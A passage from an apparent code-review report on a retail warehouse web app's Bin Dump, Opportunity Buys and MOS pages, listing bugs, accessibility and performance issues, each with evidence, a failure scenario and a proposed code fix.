**Evidence.** `const dup = await bdRecent(store, v.barcode);` runs on every new pallet. The probe saw `action=bin-dump-recent&store=BL1&barcode=` fire for a typed entry with no barcode, and the worker returns [] without querying for a null code (binDumpBarcodeMatches, worker.js:7591). Its stated purpose (27988-27991) is "to avoid uploading a 250 KB photo only to have it refused", which does not apply to photoless entries, and bdPostAllowingDuplicate already handles the 409. Production had 0 barcode collisions in 31 rows (todo.md 2819-2824). After the log POST, `await bdLoad()` refetches up to 500 rows.

**Failure scenario.** On a 30-pallet unload over warehouse Wi-Fi, each Submit waits for recent, then log, then list in series. The extra round trip is paid on 100% of submits to save a re-upload on roughly 0%.

**Proposed fix.** `const dup = (v.barcode && bdState.photo) ? await bdRecent(store, v.barcode) : { barcode_matches: [] };`. The 409 retry covers every other case with the same UX. Optionally, after success, splice the returned {id, store, logged_at, week} plus fields into bdState.rows and re-render instead of blocking on a full bdLoad.

<a id="bin-dump-18"></a>
#### bin-dump-18 — bdThisWeek uses the device's time zone while the worker files weeks in Eastern

*low · minor · bug · confidence high · `index.html:28070` · unverified*

**Evidence.** `function bdThisWeek() { const n = new Date(); const s = new Date(n.getFullYear(), n.getMonth(), n.getDate() - n.getDay()); …}` is device-local, while binDumpWeekOf (worker.js:7687) uses America/New_York. Node check at 2026-09-20T01:30Z (Sat 9:30 pm ET): TZ=America/New_York gives client 2026-09-13 and worker 2026-09-13; TZ=UTC gives client 2026-09-20 and worker 2026-09-13.

**Failure scenario.** On a device not set to Eastern (a laptop on UTC, someone travelling), Saturday evening shows This-week tiles of 0 and no 'This week' badge, and the 'This week' CSV export says "Nothing to export in that range."

**Proposed fix.** Derive the week from the existing etTodayStr() (index.html:7603): `const [y,m,d] = etTodayStr().split('-').map(Number); const s = new Date(y, m-1, d - new Date(y, m-1, d).getDay()); return ymd(s);`

<a id="bin-dump-19"></a>
#### bin-dump-19 — Keyboard and focus: the modal takes no focus and has no Escape, the store select is unlabelled, and toggling a week loses focus

*low · minor · accessibility · confidence high · `index.html:27707` · unverified*

**Evidence.** `function bdOpenModal() { el('bd-modal').style.display = 'flex'; }` moves no focus (the probe's document.activeElement stayed BODY after the verify modal opened), and bdCloseModal returns no focus. The only Bin Dump keydown handler returns early unless the lightbox is open (27873-27880), so Escape does nothing on #bd-modal. #bd-store (2936) has no label or aria-label, while its twin #mos-store has aria-label="Store" (4014). bdToggleWeek (28156-28159) re-renders all of #bd-weeks, destroying the focused .bd-wk-head button, and the `.bd-wk-body` grid-template-rows transition (2820) never plays because the node is replaced.

**Failure scenario.** A keyboard user presses Enter on EDIT: focus stays behind the overlay, Tab walks the page underneath, and Escape does nothing. Pressing Enter on a week header drops focus to <body>, so they have to tab back through the page. A screen reader announces the store select as an unnamed combobox.

**Proposed fix.** In bdOpenModal, remember document.activeElement and focus the first input (or #bd-m-title with tabindex=-1); restore that focus in bdCloseModal. In the existing keydown handler, add `else if (e.key === 'Escape' && el('bd-modal').style.display === 'flex' && !document.querySelector('[role=dialog][aria-modal=true][style*="99999"]')) bdCloseModal();` so a uiConfirm keeps precedence. Add aria-label="Store" to #bd-store. Toggle a week in place (`section.classList.toggle('open'); btn.setAttribute('aria-expanded', …)`) instead of re-rendering.

<a id="bin-dump-20"></a>
#### bin-dump-20 — Identifier inputs allow autocapitalise and autocorrect, and the exact-match barcode check then misses a typed duplicate

*low · minor · bug · confidence medium · `index.html:27595` · unverified · fixed 2026-09-23*

**Evidence.** `<input class="bd-in" type="text" id="bd-f-${f.k}" data-k="${f.k}" …>` has no autocapitalize, autocorrect, spellcheck or autocomplete attributes. The worker compares `WHERE barcode = ?` (binary, case-sensitive) after tagText, which trims but does not normalise case (worker.js:7591-7599, 7694-7699).

**Failure scenario.** A manager keys a torn tag by hand on iOS and types prm-10490-30. Default sentence capitalisation stores 'Prm-10490-30', which does not match the scanned 'PRM-10490-30', so the same pallet is logged twice with no duplicate prompt. Autocorrect can also rewrite a 'Created by' name.

**Proposed fix.** In bdFieldRow, add `autocomplete="off" autocorrect="off" spellcheck="false"` and `autocapitalize="characters"` for barcode, item_no, po, sup_ref and truck_no (`words` for created_by_tag). This changes only keyboard behaviour, not the write path. A later (major) change could normalise barcode case and whitespace server-side and in the match query.

<a id="bin-dump-21"></a>
#### bin-dump-21 — Editing any field of a row that already shares a barcode raises the duplicate prompt on every save

*low · minor · bug · confidence medium · `worker.js:24650` · unverified*

**Evidence.** bin-dump-update always runs `binDumpBarcodeMatches(env, fields.barcode, …, id)` and returns 409 unless allow_duplicate is sent. It excludes only this row, and runs even when the barcode did not change. The code comment says the check exists for "Correcting a barcode INTO one that already exists".

**Failure scenario.** Once a pair exists (logged via override, or from before the guard), every later fix to either row, even just its units, asks "Duplicate pallet … Save this correction anyway?". That is the click-through habit the repo warns against ("a warning that fires on good pallets trains people to click through it").

**Proposed fix.** Worker only and backward-compatible: select `store, barcode` in the existing row lookup (24642), and run the duplicate check only when `tagText(row.barcode, 60) !== fields.barcode`. Add a test that a units-only edit on a known pair returns 200 without allow_duplicate.

<a id="bin-dump-22"></a>
#### bin-dump-22 — The duplicate prompt makes the override the green, focused default

*low · minor · ui-ux · confidence high · `index.html:28029` · unverified · fixed 2026-09-23*

**Evidence.** bdConfirmDuplicate calls `uiConfirm(…, { title: 'Duplicate pallet', okText: isEdit ? 'Save anyway' : 'Log it anyway' })` without `danger`. _uiDialog paints OK in the primary green, focuses it, and resolves true on Enter (7799-7800, 7825). The code says "Backing out here is the expected answer" (27911-27912).

**Failure scenario.** The riskier choice (counting a pallet's units twice) is styled as the recommended action. On desktop, pressing Enter out of habit confirms it.

**Proposed fix.** Pass `danger: true, cancelText: "Don't log it"` so the override reads as the risky choice. A `focusCancel` option in _uiDialog would complete it, but that is shared code; danger:true alone is the minimal change.

<a id="bin-dump-23"></a>
#### bin-dump-23 — View-only accounts are told to 'tap Edit' and 'Press Begin'

*low · minor · ui-ux · confidence high · `index.html:28100` · unverified · fixed 2026-09-23*

**Evidence.** `… Tap a week to open it; tap Edit on a row to correct it.` and `'No pallets logged yet. Press Begin to scan the first tag.'` are shown regardless of `canEdit`. For view-only users the row button reads VIEW (28148-28149) and the Scan tab is hidden (27520).

**Failure scenario.** A view-only associate is told to tap an Edit button that does not exist and a Begin button they cannot reach, which is the permission-versus-broken confusion the VIEW label was added to prevent.

**Proposed fix.** Branch on canEdit: 'tap View on a row to see its tag' and 'No pallets logged yet.'

<a id="bin-dump-24"></a>
#### bin-dump-24 — Opening a photoless (typed) row hides who logged it and when

*low · minor · ui-ux · confidence high · `index.html:27655` · unverified*

**Evidence.** The provenance line `Logged ${bdWhen(row.logged_at)} by ${row.logged_by} … Editing keeps that timestamp.` is written into #bd-m-readsub, inside #bd-m-shot, and the else branch hides #bd-m-shot when `!row.has_photo` (27661-27663). Every Enter Manually pallet has no photo. The same trap is already noted for the verify form (3033-3035).

**Failure scenario.** A manager opens a hand-typed pallet to check who keyed it in, or when, and the modal shows only the fields.

**Proposed fix.** In the else branch, show #bd-m-manual (it sits outside the shot): `el('bd-m-manual').hidden = false; el('bd-m-manual').textContent = `Typed by hand — no tag photo. Logged ${bdWhen(row.logged_at)} by ${row.logged_by || 'unknown'}.`;`

<a id="bin-dump-25"></a>
#### bin-dump-25 — In the installed PWA, the verify modal's header and × sit under the status bar / Dynamic Island

*low · minor · ui-ux · confidence medium · `index.html:3015` · unverified*

**Evidence.** #bd-modal is `fixed inset-0 … p-4` and its panel has `max-height:92vh`, with no safe-area padding. The app uses `viewport-fit=cover` (line 5) and `apple-mobile-web-app-status-bar-style` black-translucent (line 17). Probe at 393×852 with a fully read tag: panel top 34px, bottom 818px (784px tall). The top safe-area inset on current iPhones is 47-59px.

**Failure scenario.** In the installed app on an iPhone 14 Pro or later, the sticky 'Verify pallet tag ×' bar is partly behind the Dynamic Island and status clock, and the × is hard to hit.

**Proposed fix.** `#bd-modal{padding:max(16px,env(safe-area-inset-top)) 16px max(16px,env(safe-area-inset-bottom))}`, and set the panel's max-height to 100% of that padded box instead of 92vh.

<a id="bin-dump-26"></a>
#### bin-dump-26 — binDumpWeekOf builds a new Intl.DateTimeFormat for every row

*low · minor · performance · confidence high · `worker.js:7688` · unverified*

**Evidence.** `const et = new Intl.DateTimeFormat("en-CA", { timeZone: "America/New_York" }).format(new Date(iso));` is called per row in bin-dump-list (24620), which the CSV 'Everything' export runs for up to 5000 rows. Node/V8 benchmark: 5000 per-row constructions took 367 ms; one hoisted formatter took 9 ms.

**Failure scenario.** Each Log load spends about 37 ms of Worker CPU (500 rows), and an 'Everything' export about 0.4 s, just building formatters, adding latency to every list call.

**Proposed fix.** Hoist `const ET_YMD_FMT = new Intl.DateTimeFormat('en-CA', { timeZone: 'America/New_York' });` to module scope and use `ET_YMD_FMT.format(new Date(iso))`. Worker only, with identical output.

<a id="bin-dump-27"></a>
#### bin-dump-27 — Lightbox wheel zoom ignores the wheel delta, so trackpad scroll or pinch jumps straight to 8×

*low · minor · ui-ux · confidence medium · `index.html:27852` · unverified*

**Evidence.** `bdLbSet(bdLbZoomAt(bdLb, bdLbGeo(), bdLb.s * (e.deltaY < 0 ? 1.18 : 1 / 1.18), a.ax, a.ay));` gives a fixed ×1.18 per event whatever deltaY, deltaMode or ctrlKey is. A trackpad sends dozens of small wheel events per gesture (1.18^15 ≈ 12, so it clamps at 8×).

**Failure scenario.** On a MacBook, a gentle two-finger scroll or pinch over the tag slams the zoom to 800% or back to 100%, and a two-finger scroll cannot pan, so a desktop user checking a digit cannot zoom by small steps.

**Proposed fix.** `const k = Math.exp(-e.deltaY * (e.deltaMode === 1 ? 0.05 : 0.0025));` then zoom by `bdLb.s * k`. When `!e.ctrlKey && bdLb.s > 1.001`, pan by (-e.deltaX, -e.deltaY) through bdLbClamp instead of zooming.

</details>

<a id="oppbuys-mos"></a>
### Opportunity Buys + MOS

Both pages are carefully built. Every Clover, manifest and user string is escaped before it reaches innerHTML, there are no native dialogs, the permission gates match the worker (can_edit comes from the worker, mosCanDelete matches FINANCIAL_ROLES, auth-me stores match allowedStores), the new-buy and manifest writes are guarded against double-submit, and the three offline suites pass (test-mos 163, test-opportunity-buys 174, test-ob-manifest 193). The most serious problem is in the Sold figures on the buy page. ob-buy-detail credits a buy with every sale of any code that was printed under its PO. A print from before Phase 2 carries the ordinary code (BL-50002-1_5), so every $1.50 beverage sold at every store gets counted. Against a scratch SQLite, the real SQL reported 66 sold where the buy sold 1. PO 99999 in production has exactly that pair of lines. On the MOS side, the problems cluster around the entry path, and a stubbed, offline real-Chromium run confirmed each one: (1) tapping Scan twice leaves a camera stream running for good; (2) leaving the page while the camera is opening starts it on the hidden page; (3) with 'All stores' selected, an entry is saved to the first store without any sign of it; (4) an older lookup reply that arrives late replaces the sticker the user just typed; (5) the client's parseInt gets around the worker's quantity check ('2,000' is logged as 2). Smaller issues: the CSV export writes 0.00 for the retail total of stickers that have no price; the months window will soon show a partial oldest month as if it were complete; OB network errors leave buttons disabled; dark-mode error text is #ef4444 at 4.25:1; and the phones hit iOS zoom-on-focus and tap targets under 44px. Two worker queries grow on every call: tracked_from is a MIN() that walks every coded archive row, and each MOS lookup/log parses the whole item-cost master.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [oppbuys-mos-1](#oppbuys-mos-1) | high | major | bug | Buy 'Sold' counts every sale of an ordinary (non-PO) code printed under the buy, across all stores | `worker.js:23840` | unverified |
| [oppbuys-mos-2](#oppbuys-mos-2) | medium | minor | bug | MOS scanner: a double tap, or leaving while the camera opens, leaves a live camera stream | `index.html:29895` | **fixed 2026-09-23** |
| [oppbuys-mos-3](#oppbuys-mos-3) | medium | minor | bug | MOS entries silently land in the first store when 'All stores' is selected or after revisiting the page | `index.html:29753` | **fixed 2026-09-23** |
| [oppbuys-mos-4](#oppbuys-mos-4) | medium | minor | bug | Out-of-order responses: a stale mos-lookup overwrites the sticker the user just entered, and mos-list races on store switches | `index.html:29811` | **lookup half fixed 2026-09-23**; mos-list race open |
| [oppbuys-mos-5](#oppbuys-mos-5) | medium | minor | bug | Client parseInt gets around the worker's quantity shape check ('2,000' is logged as 2, '1.5' as 1) | `index.html:30074` | unverified |
| [oppbuys-mos-6](#oppbuys-mos-6) | medium | minor | bug | MOS CSV export writes Total Retail 0.00 for stickers with no price | `index.html:30319` | unverified |
| [oppbuys-mos-7](#oppbuys-mos-7) | medium | minor | bug | Opportunity Buys: a network failure throws out of obApi, leaving 'Loading…' forever and write buttons disabled | `index.html:29370` | unverified |
| [oppbuys-mos-8](#oppbuys-mos-8) | medium | minor | bug | mos-list's rolling-day window returns a partial oldest month that is displayed as a complete month total | `worker.js:25574` | unverified |
| [oppbuys-mos-11](#oppbuys-mos-11) | medium | minor | accessibility | Dark mode: MOS red text uses #ef4444 on its own wash, 4.25:1 (fails AA, against DESIGN.md §4.8) | `index.html:3862` | **fixed 2026-09-23** |
| [oppbuys-mos-13](#oppbuys-mos-13) | medium | minor | security | MOS CSV export does not neutralise spreadsheet formulas in user-taught descriptions and names | `index.html:30308` | unverified |
| [oppbuys-mos-19](#oppbuys-mos-19) | medium | minor | performance | Every buy detail open walks all coded archive rows for MIN(date) | `worker.js:23828` | unverified |
| [oppbuys-mos-15](#oppbuys-mos-15) | medium | major | security | mos-update lets any page-edit account cut a recorded loss or move it out of Shrink, keeps no prior value, and the UI never shows the edit | `worker.js:25673` | unverified |
| [oppbuys-mos-9](#oppbuys-mos-9) | low | minor | bug | Closing an already-closed buy overwrites who closed it and when; the Close button has no busy guard | `worker.js:23997` | unverified |
| [oppbuys-mos-10](#oppbuys-mos-10) | low | minor | bug | MOS 'This month' is the newest month that has entries, not the current ET month (badge and export) | `index.html:30304` | unverified |
| [oppbuys-mos-12](#oppbuys-mos-12) | low | minor | bug | Save confirmation double-escapes the category name ('BEDDING &amp; PILLOWS') | `index.html:30090` | unverified |
| [oppbuys-mos-14](#oppbuys-mos-14) | low | minor | bug | An account with no MOS store sees the entry form, and the explanation is written into the hidden Log pane | `index.html:29323` | unverified |
| [oppbuys-mos-16](#oppbuys-mos-16) | low | minor | bug | Opportunity Buys list/detail responses are applied out of order | `index.html:29470` | unverified |
| [oppbuys-mos-17](#oppbuys-mos-17) | low | minor | ui-ux | The 'more to the right' fade scrolls away with the table and never turns off at the end | `index.html:3767` | unverified |
| [oppbuys-mos-18](#oppbuys-mos-18) | low | minor | bug | The OB manifest CSV is always decoded as UTF-8, so Excel's default Windows-1252 CSVs lose characters | `index.html:29577` | unverified |
| [oppbuys-mos-20](#oppbuys-mos-20) | low | minor | performance | Each MOS lookup and log parses the whole item-cost master to read one category cost | `worker.js:13351` | unverified |
| [oppbuys-mos-21](#oppbuys-mos-21) | low | minor | performance | mosSave stays 'busy' through a full 6-month log reload, so a quick next Save is silently ignored | `index.html:30093` | unverified |
| [oppbuys-mos-22](#oppbuys-mos-22) | low | minor | ui-ux | Phone: sub-16px inputs trigger iOS zoom-on-focus and most controls are under 44px | `index.html:3923` | unverified |
| [oppbuys-mos-23](#oppbuys-mos-23) | low | minor | ui-ux | MOS tables force 800px on a phone, putting Edit/Remove off-screen; under 'All stores' there is no Store column | `index.html:3982` | unverified |
| [oppbuys-mos-24](#oppbuys-mos-24) | low | minor | bug | 'Marked out today' and collapsed month headers show short cost totals with no caveat | `index.html:30226` | unverified |
| [oppbuys-mos-25](#oppbuys-mos-25) | low | minor | accessibility | A11y: buy rows are mouse-only; status and error lines are not announced; the OB form's errors render in muted grey | `index.html:29440` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="oppbuys-mos-1"></a>
#### oppbuys-mos-1 — Buy 'Sold' counts every sale of an ordinary (non-PO) code printed under the buy, across all stores

*high · major · bug · confidence high · `worker.js:23840` · unverified*

**Evidence.** worker.js:23834-23842 `SELECT store, code, SUM(CASE WHEN refunded = 0 THEN qty ELSE 0 END) AS sold_units ... FROM payment_archive_items WHERE code IS NOT NULL AND code IN (SELECT DISTINCT code FROM sticker_prints WHERE po = ?) GROUP BY store, code`, and worker.js:23850 `const totalSold = [...soldBy.values()].reduce(...)` sums every (store, code) pair, including stores that have no line. Phase-1 prints stored `po` with an ordinary code (tasks/todo.md Phase 1: 'OB items get ordinary two-segment codes'). sticker-printed (worker.js:23676-23701) still accepts a po with any code. index.html:3725-3730 and the browser fixture both describe the production pair BL-50002-1_5 / BL-50002-1_5-P99999 on PO 99999. I ran the exact SQL (sliced from worker.js) on a scratch SQLite with PO 99999 printed as BL-50002-1_5 (BL2) and BL-50002-1_5-P99999, plus ordinary sales of BL-50002-1_5 at BL2 (40) and BL1 (25) and one OB sale. It returned three rows, and totalSold = 66 where the true figure is 1. BL1 contributes 25 even though the buy printed nothing there. index.html:29493 `obSoldCell` then prints the inflated number as a fact.

**Failure scenario.** Brian opens PO 99999 (or any buy with a label printed before Phase 2 deployed). The BL-50002-1_5 line's Sold cell and the status line ('66 sold …') count every $1.50 beverage rung up at every store since tracking began. The page states the one number it exists for (sell-through) with confidence, and it is wrong by an order of magnitude.

**Plan.** FUTURE PLAN. (1) Frontend first, backward-compatible with the current worker, which never sends null: obSoldCell(n) renders 'not tracked' when n === null. obRenderDetail's sentence mentions 'N lines printed before the PO was in the code cannot be attributed' when the worker supplies that count. (2) Worker (ob-buy-detail): attribute only codes that carry this PO. Filter in JS with `mosParseCode(code)?.po === po`, or in SQL with `substr(code, -(length(?)+2)) = '-P' || ?`; do not use LIKE, because `_` and `.` are legal PO characters. Lines whose code lacks the marker return `sold: null, refunded_units: null`. totalSold sums only (store, code) pairs that appear in `lines`, and the response adds `unattributable_lines`. (3) Worker guard in sticker-printed: refuse a `po` whose code does not end in `-P<po>`, so no new rows can recreate this. Deploy order: frontend, then worker. Either order is safe (an old client shows the worker's null as '0', which is less wrong than 66), but frontend first avoids that confident 0. Risks: a PO containing '-P' inside itself. Parse with mosParseCode rather than string-splitting. Verify: add a block to test-opportunity-buys.mjs with an ordinary-code print on the PO and ordinary sales at two stores; assert sold excludes them and the line's sold is null. The browser check asserts that cell reads 'not tracked'.

<a id="oppbuys-mos-2"></a>
#### oppbuys-mos-2 — MOS scanner: a double tap, or leaving while the camera opens, leaves a live camera stream

*medium · minor · bug · confidence high · `index.html:29895` · unverified · fixed 2026-09-23*

**Evidence.** index.html:29895 `if (mosScanning) { mosStopScan(); return; }` is the only re-entry guard, but mosScanning is only set at 29916 (`mosStream = stream; mosScanning = true;`), after `await mosLoadDecoder()` and `await navigator.mediaDevices.getUserMedia(...)` (29911). The button gives no feedback until play() resolves (29921-29923). A second call overwrites mosStream, and mosStopScan (29991-29999) stops only the current one. The navigateToPage cleanup (12050, `if (page !== 'mos' ...) mosStopScan()`) runs before a pending getUserMedia resolves. Proven in headless Chromium with a fake camera (all network aborted, fetch stubbed). Two mosScan() calls 80 ms apart gave streams ['live','live']. After the Stop tap: ['live','ended']. After navigating to the dashboard: still ['live','ended']. It also raised an uncaught 'AbortError: The play() request was interrupted'. Calling mosScan() and then navigating away within 100 ms gave a live stream on a hidden #page-mos, which only the 40 s timeout at 29957 ends.

**Failure scenario.** On a phone the camera takes 300-500 ms to open. The associate taps 'Scan QR', sees nothing happen, and taps again. Two streams open. 'Stop' or a successful decode stops one, and the other keeps the camera light on and the lens held until the PWA is killed. That is the battery drain and 'app is watching me' failure the comment at 12048-12049 exists to prevent, and it can block Price Scan from opening the camera.

**Proposed fix.** Add a start generation. `let mosScanGen = 0, mosStarting = false;`. In mosScan: `if (mosScanning || mosStarting) { mosStopScan(); return; } mosStarting = true; const gen = ++mosScanGen;` and set the label to 'Starting…'. After getUserMedia: `mosStarting = false; if (gen !== mosScanGen || el('page-mos').classList.contains('hidden') || mosState.tab !== 'mark') { stream.getTracks().forEach(t => t.stop()); return; }`. Wrap `await video.play()` in try/catch that calls mosStopScan() and sets a status. In mosStopScan: `mosScanGen++; mosStarting = false;`. While there, reset `#mos-torch` style.background/color there too: today the button keeps its white 'on' look on the next scan while the torch is off (30026-30027 are never reset). Optionally stop the scan on `visibilitychange` to hidden.

<a id="oppbuys-mos-3"></a>
#### oppbuys-mos-3 — MOS entries silently land in the first store when 'All stores' is selected or after revisiting the page

*medium · minor · bug · confidence high · `index.html:29753` · unverified · fixed 2026-09-23*

**Evidence.** index.html:29753-29758 `function mosEntryStore() { const v = el('mos-store').value; if (v && v !== 'ALL') return v; const s = mosStores(); return s.length ? s[0] : ''; }`. The store select is shared by the Mark and Log tabs, and the Mark pane never shows which store an entry goes to. initMos (29312-29315) rebuilds the select and resets it to stores[0] on every visit (`if (stores.length) sel.value = stores[0];`) but never calls mosReset, so a resolved sticker survives while the store under it changes. Proven in the browser probe: a manager holding BL1+BL2 selects 'All stores', looks up and saves. The mos-log body was `{"store":"BL1",...}` while #mos-store still read 'ALL'.

**Failure scenario.** A multi-store manager switches to 'All stores' to read the Log, flips back to 'Mark out' and scans a damaged item from BL2. The shrink is recorded against Coliseum (BL1), and both stores' month totals are now wrong. The same happens to someone on BL2 who resolves a sticker, taps to another page and comes back: the select is back on BL1 and Save writes there.

**Proposed fix.** (a) In mosRecalc, add `el('mos-store').value !== 'ALL'` to the Save gate. When it is ALL, show 'Pick the store you are marking out for' in the commit bar (or have mosSetTab('mark') switch the select to a single store). (b) Show the entry store in the commit bar, e.g. 'Marking out at Coliseum'. (c) In initMos keep the previous selection when it is still valid (`const prev = sel.value; …; sel.value = (prev === 'ALL' && stores.length > 1) || stores.includes(prev) ? prev : stores[0];`), and call mosReset() whenever the store actually changes. The same pattern exists in Bin Dump's bdScanStore.

<a id="oppbuys-mos-4"></a>
#### oppbuys-mos-4 — Out-of-order responses: a stale mos-lookup overwrites the sticker the user just entered, and mos-list races on store switches

*medium · minor · bug · confidence high · `index.html:29811` · unverified · lookup half fixed 2026-09-23 (mos-list race open)*

**Evidence.** index.html:29804-29823 mosLookup `await fetch(...mos-lookup...)` then `mosApply(j)` with no request token, and mosSave uses `mosState.resolved.code` (30079 `code: r.code`), not the input box. mosLoad (30104-30126) is likewise unguarded, and it is triggered by mosStoreChange (29748) and after every save. Proven in the browser probe with a 600 ms first lookup and an instant second one: #mos-code read 'BL-22222-2' while #mos-f-item, which is what Save would log, read '11111'. Lookup latency varies: a learned code is one D1 read, while an unlearned one walks up to five KV maps and writes D1 (worker.js:13323-13375).

**Failure scenario.** The user types a code, presses Enter, notices a wrong digit, fixes it and presses Enter again. The first code was unlearned and slow, so its reply lands last. The box shows the corrected code, the panel shows the wrong category, and 'Mark out of stock' writes shrink for the wrong category. Switching BL1 to BL2 quickly can likewise paint BL1's log and 'Marked out today' under a BL2 heading.

**Proposed fix.** `let mosLookupSeq = 0, mosLoadSeq = 0;`. In mosLookup: `const seq = ++mosLookupSeq;` and after the await, and in the catch, `if (seq !== mosLookupSeq) return;`. In mosReset (and therefore mosStoreChange), bump `mosLookupSeq++` so an in-flight lookup cannot repopulate a cleared form. In mosLoad: `const seq = ++mosLoadSeq; … if (seq !== mosLoadSeq) return;` before touching mosState or the DOM.

<a id="oppbuys-mos-5"></a>
#### oppbuys-mos-5 — Client parseInt gets around the worker's quantity shape check ('2,000' is logged as 2, '1.5' as 1)

*medium · minor · bug · confidence high · `index.html:30074` · unverified*

**Evidence.** index.html:30074 `const qty = parseInt(el('mos-qty').value, 10) || 0;` sends a NUMBER, and worker.js:13301 `if (typeof raw === "number") return Number.isInteger(raw) && raw >= 1 ...` accepts it. The worker's digit check (13302 `/^\d{1,6}$/`) only ever sees strings, and its comment at 25469-25472 names exactly this failure: 'parseInt("12abc") is 12 … a quantity nobody typed, landing silently in a shrink total'. mosRecalc (29789) and mosEdit (30242 `parseInt(qty, 10)`) do the same. Executed: '12abc'→12, '1.5'→1, '2,000'→2, '1e3'→1 are all accepted by mosQty(number), while mosQty on the raw string returns null for each. Browser probe: typing '2,000' showed Cost '$0.70' (the 2-unit cost) and posted qty 2. Related: the teach gate (29798) enables Save for '123', but the worker requires a letter (25501). The worker then answers NEEDS_DESCRIPTION, and mosErr has no case for it, so the user sees 'Nothing on file names item … yet' after typing a name.

**Failure scenario.** A manager on a desktop or with a paste types '2,000' units of damaged seasonal. Two units are logged, the preview agrees with the wrong number, and the month's shrink is understated by 1,998 units with no error.

**Proposed fix.** Add one helper and use it in mosRecalc, mosSave and mosEdit: `const mosQtyOf = (s) => { const t = String(s ?? '').trim(); return /^\d{1,6}$/.test(t) && +t >= 1 && +t <= 100000 ? +t : 0; };`. Save stays disabled when it returns 0. mosEdit shows 'Enter a whole number of units' for anything that fails it. mosBump can keep parseInt, since it writes a clean value back. Mirror the teach rule: `named = !needsName || (v.length >= 3 && /[a-z]/i.test(v))`, and map NEEDS_DESCRIPTION in mosErr to 'Type the name with at least one letter'.

<a id="oppbuys-mos-6"></a>
#### oppbuys-mos-6 — MOS CSV export writes Total Retail 0.00 for stickers with no price

*medium · minor · bug · confidence high · `index.html:30319` · unverified*

**Evidence.** index.html:30318-30319 `money(x.unit_cost_cents === null ? null : x.unit_cost_cents * x.qty), money(x.unit_price_cents), money(x.unit_price_cents * x.qty)`. Cost is guarded but retail is not, and `null * 3 === 0`. Executed with the page's own `money`: unit_price_cents null, qty 3 gives Unit Retail '' and Total Retail '0.00'. Priceless stickers (BL-10380) are a supported shape (worker.js:13253-13257, tasks/mos.md §4: 'unknown is recorded as null, never as zero').

**Failure scenario.** Brian exports 'Last 6 months' for accounting. Every priceless-sticker line shows Total Retail 0.00 next to a blank Unit Retail, and summing the column in Excel silently understates retail value, which is exactly what the month's lines_without_price caveat exists to prevent.

**Proposed fix.** `money(x.unit_price_cents === null || x.unit_price_cents === undefined ? null : x.unit_price_cents * x.qty)`. Use the same null/undefined test on the cost line for symmetry.

<a id="oppbuys-mos-7"></a>
#### oppbuys-mos-7 — Opportunity Buys: a network failure throws out of obApi, leaving 'Loading…' forever and write buttons disabled

*medium · minor · bug · confidence high · `index.html:29370` · unverified*

**Evidence.** index.html:29369-29374 `async function obApi(url, opts) { const r = await fetch(WORKER_BASE + url, ...); let j = null; try { j = await r.json(); } catch (_) {} return { status: r.status, j }; }`. Only the JSON parse is caught, and a rejected fetch propagates. No caller has a try/catch: obCreate sets `go.disabled = true` (29695) and then `await obApi(...)` (29697); obReplaceManifest sets `btn.disabled = true` (29604) before `await obUploadCsv`; obLoad has already called `obSay('Loading…')` (29396). Every caller already handles `status !== 200` with the worker's sentence or a fallback.

**Failure scenario.** A buyer on warehouse wifi taps 'Open it' just as the signal drops. The request rejects, 'Opening…' stays on screen, and the 'Open it' button stays disabled until a full reload (obToggleNew never re-enables it). The list shows 'Loading…' indefinitely, and obSetClosed fails with no message at all.

**Proposed fix.** `async function obApi(url, opts) { let r; try { r = await fetch(WORKER_BASE + url, Object.assign({ credentials: 'include' }, opts || {})); } catch (e) { return { status: 0, j: { error: 'Could not reach the server. Check the connection and try again.' } }; } let j = null; try { j = await r.json(); } catch (_) {} return { status: r.status, j }; }`. Every caller's existing error branch then re-enables its button and shows the sentence.

<a id="oppbuys-mos-8"></a>
#### oppbuys-mos-8 — mos-list's rolling-day window returns a partial oldest month that is displayed as a complete month total

*medium · minor · bug · confidence high · `worker.js:25574` · unverified*

**Evidence.** worker.js:25574 `binds.push(new Date(Date.now() - (months * 31 + 1) * 86400000).toISOString());` uses a rolling window, not one aligned to months. The totals query (25586) then groups everything after it by ET month. Executed with the real mosMonthOf: months=6 on 2026-09-22 gives cutoff 2026-03-19 and SEVEN groups (2026-03 … 2026-09), with March covering only the 19th-31st. The client (index.html:30108 `months=6`) renders each group as '<Month> · N lines · $X cost' with no partial marker. The comment at 25570-25572 says under-fetching 'would drop the oldest visible month's first entries out of its own total', which is exactly what happens to the seventh group.

**Failure scenario.** From about March 2027, when the log holds more than six months, the Log tab shows 'March 2027 · 12 lines · $4.20 cost' for a month that really cost more. The first 18 days are missing, and the header looks as authoritative as the others.

**Proposed fix.** Worker only, backward-compatible. Compute the oldest whole month: `const [y, m] = mosMonthOf(new Date().toISOString()).split('-').map(Number); const first = new Date(Date.UTC(y, m - 1 - (months - 1), 1)); const firstMonth = first.toISOString().slice(0, 7);`. Bind `new Date(first.getTime() - 86400000).toISOString()`, a day early for the ET offset. Then skip rows whose `mosMonthOf(r.logged_at) < firstMonth` in the byMonth loop and in `rows`. Add a test-mos case at a month boundary.

<a id="oppbuys-mos-11"></a>
#### oppbuys-mos-11 — Dark mode: MOS red text uses #ef4444 on its own wash, 4.25:1 (fails AA, against DESIGN.md §4.8)

*medium · minor · accessibility · confidence high · `index.html:3862` · unverified · fixed 2026-09-23*

**Evidence.** index.html:3862 `.dark #page-mos{… --mbad:#ef4444;--mbadw:rgba(239,68,68,.12) …}`, used as TEXT on that wash by `.mos-status.err{…background:var(--mbadw);color:var(--mbad)}` (3952), `.mos-chip.Stolen` (3997) and `.mos-rz[data-r="Stolen"][aria-pressed="true"]` (3936). Computed: #ef4444 over rgba(239,68,68,.12) on op-panel #101826 is 4.25:1 (OLED 4.78). DESIGN.md §4.8: '`#ef4444` … on its own wash … measures 4.25:1 and fails AA … red TEXT in dark takes `#f87171`'. #f87171 gives 5.78:1 dark and 6.50 OLED. Light #c0392b is 4.69 and passes. Also checked: light --mwarn #b45309 on its wash is 4.55 (passes, barely), and dark green, blue and amber are 5.77-7.69.

**Failure scenario.** Every failed lookup or save ('That doesn't read as a shelf sticker', 'You are not assigned to that store', 'No camera available') is shown in dark mode, the app's primary theme, below AA contrast. The Stolen chip in every log row is too.

